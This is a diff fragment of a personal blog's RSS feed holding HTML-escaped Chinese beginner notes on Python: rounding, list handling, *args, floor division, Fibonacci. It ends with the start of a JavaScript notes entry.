+&lt;h3 id=&#34;保留小数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#保留小数&#34;&gt;#&lt;/a&gt; 保留小数&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p red&#39;&gt;round()&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;round&lt;/span&gt;(计算表达式,保留位数)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;round&lt;/span&gt;(a/b,&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#保留2位小数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;或者在打印时保留&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;aver=&amp;#123;:.2f&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(aver))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;aver=&lt;span class=&#34;subst&#34;&gt;&amp;#123;aver:&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;f&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;对列表数据进行处理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对列表数据进行处理&#34;&gt;#&lt;/a&gt; 对列表数据进行处理&lt;/h2&gt;
+&lt;h3 id=&#34;计算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计算&#34;&gt;#&lt;/a&gt; 计算&lt;/h3&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;sum&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#计算总和&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#计算长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;list () 可以把列表中的整形元素取出来当做数字处理&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;-swig24-&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#-swig24-&#34;&gt;#&lt;/a&gt; &lt;span class=&#39;p red&#39;&gt;判断列表中是否有重复元素&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p cyan&#39;&gt;能够删除列表中的重复元素&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;x = &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;runoob&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#删除重复元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt;&amp;gt;x = &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;runoob&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;y = &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;google&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;x, y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;([&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;u&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;o&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;n&amp;#x27;&lt;/span&gt;]), &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;([&lt;span class=&#34;string&#34;&gt;&amp;#x27;e&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;o&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;g&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;l&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p cyan&#39;&gt;判断列表中是否有重复元素&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用了判断列表长度的方法，真是想不到，我第一想法是两个循环&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;check&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;) != &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 包含重复元素则不相等，返回true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;大写&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#大写&#34;&gt;#&lt;/a&gt; 大写&lt;/h2&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a.upper()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.isupper() &lt;span class=&#34;comment&#34;&gt;# 判断是否大写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;把一个整数每一位分开变成列表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#把一个整数每一位分开变成列表&#34;&gt;#&lt;/a&gt; 把一个整数每一位分开变成列表&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p red&#39;&gt;str()&lt;/span&gt;    返回一个对象的string格式。
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;integer_to_list&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;n&lt;/span&gt;):  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(n))  &lt;span class=&#34;comment&#34;&gt;# 列表里的元素是字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# return [int(i) for i in str(n)]  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 把数字转换成字符串，再把每个字符转换成整数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请输入一个4位整数：&amp;quot;&lt;/span&gt;))  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(integer_to_list(n))   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;可变参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可变参数&#34;&gt;#&lt;/a&gt; 可变参数&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;参数前带一个 * 号（元祖）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sum_func&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;*args&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;sum&lt;/span&gt;(args)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result = sum_func(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(result)  &lt;span class=&#34;comment&#34;&gt;# 输出：28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;span class=&#39;p cyan&#39;&gt;args为可变参数，其可接受若干个实参值，并将接收到的值组装为一个元组。&lt;/span&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;有时候用内置函数 sum () 会报错，只能手动循环&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sum_func&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;*args&lt;/span&gt;):  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    total = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; num &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; args:  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        total += num  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; total  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result = sum_func(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(result)  &lt;span class=&#34;comment&#34;&gt;# 输出：28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p cyan&#39;&gt;两个*号代表字典&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;易错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#易错&#34;&gt;#&lt;/a&gt; 易错&lt;/h1&gt;
+&lt;h2 id=&#34;逻辑与逻辑或&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#逻辑与逻辑或&#34;&gt;#&lt;/a&gt; 逻辑与，逻辑或&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;span class=&#39;p blue&#39;&gt;只能用and和or&lt;/span&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;整除&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#整除&#34;&gt;#&lt;/a&gt; 整除&lt;/h2&gt;
+&lt;span class=&#39;p red&#39;&gt;负整数整除结果与正整数整除结果不同&lt;/span&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a = -&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b = &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(a//&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# -2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(b//&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;对于 a，因为 - 11 除以 10 等于 - 1.1，然后向下取整结果为 - 2&lt;/strong&gt;&lt;/p&gt;
+&lt;span class=&#39;p blue&#39;&gt;要想结果保持一致可以用绝对值&lt;/span&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a = &lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(a//&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;斐波那契数列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#斐波那契数列&#34;&gt;#&lt;/a&gt; 斐波那契数列&lt;/h1&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fibo&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;n&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; = [&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 这里创建列表时必须添加一个1，不然结果不对&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a, b = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(n-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a, b = b, a+b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;.append(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(fibo(n))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://starofeden.github.io/2023/11/04/JS/</guid>
             <title>js百炼成仙总结</title>
             <link>https://starofeden.github.io/2023/11/04/JS/</link>
             <pubDate>Sat, 04 Nov 2023 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;js&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js&#34;&gt;#&lt;/a&gt; JS&lt;/h1&gt;
+            <description><![CDATA[ &lt;h1 id=&#34;基础&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基础&#34;&gt;#&lt;/a&gt; 基础&lt;/h1&gt;
+&lt;h2 id=&#34;对象数据类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对象数据类型&#34;&gt;#&lt;/a&gt; 对象数据类型&lt;/h2&gt;
+&lt;h3 id=&#34;创建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#创建&#34;&gt;#&lt;/a&gt; 创建&lt;/h3&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; container = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	caoyao : &lt;span class=&#34;string&#34;&gt;&amp;quot;解毒草&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;attr&#34;&gt;feijain&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;乌木剑&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
